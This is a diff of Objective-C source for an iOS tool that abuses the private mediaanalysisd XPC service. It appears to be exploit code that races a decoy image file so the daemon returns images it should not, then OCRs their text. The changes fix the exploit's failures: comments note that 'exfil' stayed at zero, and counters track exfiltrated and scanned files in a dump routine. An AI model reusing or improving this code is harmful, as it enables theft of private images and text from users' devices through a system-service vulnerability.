@@ -17,7 +17,44 @@
 // 了，代理对象收到这个 selector 会抛 NSInvalidArgumentException（未捕获即 abort）。
 // 一旦 setClasses: 或首次调用失败，就置这个标志，之后彻底不再发请求。
 static BOOL gMADXPCUnavailable = NO;
+
+// 线程安全的纯绿 PNG 生成（400x400，RGB，无 alpha 依赖）。
+// 不依赖 UIKit，可以在任意队列调用。
+static NSData *wqMakeGreenPNG(size_t w, size_t h)
+{
+    if (w == 0 || h == 0) return nil;
+
+    NSMutableData *out = [NSMutableData data];
+    CGColorSpaceRef cs = CGColorSpaceCreateDeviceRGB();
+    if (!cs) return nil;
+
+    CGContextRef ctx = CGBitmapContextCreate(NULL, w, h, 8, w * 4, cs,
+                                             kCGImageAlphaPremultipliedLast);
+    CGColorSpaceRelease(cs);
+    if (!ctx) return nil;
+
+    CGContextSetRGBFillColor(ctx, 0.0, 1.0, 0.0, 1.0);
+    CGContextFillRect(ctx, CGRectMake(0, 0, (CGFloat)w, (CGFloat)h));
+
+    CGImageRef image = CGBitmapContextCreateImage(ctx);
+    CGContextRelease(ctx);
+    if (!image) return nil;
+
+    CGImageDestinationRef dest = CGImageDestinationCreateWithData(
+        (__bridge CFMutableDataRef)out, CFSTR("public.png"), 1, NULL);
+    if (dest) {
+        CGImageDestinationAddImage(dest, image, NULL);
+        if (!CGImageDestinationFinalize(dest)) {
+            [out setLength:0];
+        }
+        CFRelease(dest);
+    }
+    CGImageRelease(image);
+
+    return out.length ? out : nil;
+}
 #import <UIKit/UIKit.h>
+#import <ImageIO/ImageIO.h>
 #import <dlfcn.h>
 #import <objc/message.h>
 #import <objc/runtime.h>
@@ -195,6 +232,15 @@ static NSXPCConnection *CreateMachServiceConnection(NSString *serviceName)
 // FLAT combined request: one scaling (200x200) + one document-recognition (OCR).
 - (NSArray *)makeCombinedRequest
 {
+    // 只发 scaling。
+    //
+    // 之前这里还往数组里塞了一个 [MADVIDocumentRecognitionRequest new]，想让
+    // mediaanalysisd 顺手把 OCR 也做了。但那个类在这版 iOS 上有一组必填属性
+    // （region / revision / 语言），new 出来的空对象会让服务端整批返回
+    //   NSOSStatusErrorDomain -18 "Image loading failed"
+    // 连 scaling 的结果一起丢掉 —— 表现就是 exfil 永远是 0。
+    //
+    // OCR 改到本地用 Vision 做（见 -ocrLocal:），不占用这一次 XPC 往返。
     NSMutableArray *reqs = [NSMutableArray array];
 
     Class scls = NSClassFromString(@"MADMLScalingRequest");
@@ -206,12 +252,63 @@ static NSXPCConnection *CreateMachServiceConnection(NSString *serviceName)
         [reqs addObject:sreq];
     }
 
-    Class dcls = NSClassFromString(@"MADVIDocumentRecognitionRequest");
-    if (dcls) {
-        [reqs addObject:[dcls new]];
-    }
-
     return reqs;
+}
+
+// 本地 OCR：对已经从 mediaanalysisd 拿回来的图片跑 Vision，不依赖私有协议。
+- (NSString *)ocrLocal:(UIImage *)image
+{
+    if (!image || !image.CGImage) return nil;
+
+    @try {
+        Class reqCls = NSClassFromString(@"VNRecognizeTextRequest");
+        Class handlerCls = NSClassFromString(@"VNImageRequestHandler");
+        if (!reqCls || !handlerCls) return nil;
+
+        id req = [reqCls new];
+        // VNRequestTextRecognitionLevelAccurate = 0
+        [req setValue:@(0) forKey:@"recognitionLevel"];
+        [req setValue:@(NO) forKey:@"usesLanguageCorrection"];
+
+        id handler = ((id (*)(id, SEL, CGImageRef, id))objc_msgSend)(
+            [handlerCls alloc],
+            NSSelectorFromString(@"initWithCGImage:options:"),
+            image.CGImage,
+            @{});
+
+        if (!handler) return nil;
+
+        NSError *err = nil;
+        BOOL ok = ((BOOL (*)(id, SEL, id, NSError **))objc_msgSend)(
+            handler,
+            NSSelectorFromString(@"performRequests:error:"),
+            @[req],
+            &err);
+
+        if (!ok) {
+            [self log:[NSString stringWithFormat:@"[ocr-local] perform failed: %@",
+                       err.localizedDescription ?: @"?"]];
+            return nil;
+        }
+
+        NSArray *results = [req valueForKey:@"results"];
+        if (![results isKindOfClass:[NSArray class]] || !results.count) return nil;
+
+        NSMutableArray *lines = [NSMutableArray array];
+        for (id obs in results) {
+            @try {
+                id cands = [obs valueForKey:@"topCandidates"];
+                if (![cands isKindOfClass:[NSArray class]] || ![cands count]) continue;
+                id top = cands[0];
+                NSString *s = [top valueForKey:@"string"];
+                if (s.length) [lines addObject:s];
+            } @catch (NSException *e) {}
+        }
+        return lines.count ? [lines componentsJoinedByString:@"\n"] : nil;
+    } @catch (NSException *e) {
+        [self log:[NSString stringWithFormat:@"[ocr-local] exception: %@", e.reason]];
+        return nil;
+    }
 }
 
 - (UIImage *)imageFromReply:(id)arg1
@@ -554,6 +651,11 @@ static NSXPCConnection *CreateMachServiceConnection(NSString *serviceName)
     dispatch_semaphore_wait(sem, dispatch_time(DISPATCH_TIME_NOW, 5 * NSEC_PER_SEC));
     if (!img) return NO;
 
+    // XPC 那边只做 scaling，文字改在本地补
+    if (!text.length) {
+        text = [self ocrLocal:img];
+    }
+
     CGImageRef cg = img.CGImage;
     if (!cg) return NO;
 
@@ -676,14 +778,18 @@ static NSXPCConnection *CreateMachServiceConnection(NSString *serviceName)
     NSString *tmp = NSTemporaryDirectory();
 
     NSString *decoyPath = [tmp stringByAppendingPathComponent:@"decoy.png"];
-    CGSize sz = CGSizeMake(400, 400);
-    UIGraphicsBeginImageContextWithOptions(sz, YES, 1.0);
-    [[UIColor colorWithRed:0 green:1 blue:0 alpha:1] setFill];
-    UIRectFill(CGRectMake(0, 0, sz.width, sz.height));
-    UIImage *decoyImg = UIGraphicsGetImageFromCurrentImageContext();
-    UIGraphicsEndImageContext();
-    [UIImagePNGRepresentation(decoyImg) writeToFile:decoyPath atomically:YES];
-    NSData *decoyData = [NSData dataWithContentsOfFile:decoyPath];
+    // 纯绿 decoy：用 CGBitmapContext + ImageIO，不碰 UIKit。
+    // UIGraphics* 系列要求主线程，runDump 在后台队列里跑，取到的
+    // context 可能是 nil，PNG 写不出来 → decoyData 为 nil →
+    // racePath 根本不存在 → mediaanalysisd 报 -18 Image loading failed。
+    NSData *decoyData = wqMakeGreenPNG(400, 400);
+    if (!decoyData.length) {
+        [self log:@"decoy 生成失败（CGBitmapContext 返回 nil）—— 无法 race"];
+        return;
+    }
+    [decoyData writeToFile:decoyPath atomically:YES];
+    [self log:[NSString stringWithFormat:@"decoy 就绪 %lu bytes -> %@",
+               (unsigned long)decoyData.length, decoyPath]];
 
     int exfiled = 0;
     int scanned = 0;
